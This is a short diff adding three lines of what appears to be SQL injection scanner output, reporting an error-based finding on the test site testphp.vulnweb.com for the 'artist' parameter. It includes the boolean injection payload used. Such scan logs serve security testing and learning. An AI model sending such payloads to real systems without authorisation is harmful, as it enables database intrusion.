@@ -1,0 +1,3 @@
+SUCCESS: SQLi error message detected!
+Host: testphp.vulnweb.com | Parameter: artist
+Payload: artist=%20AND%2017%3D17
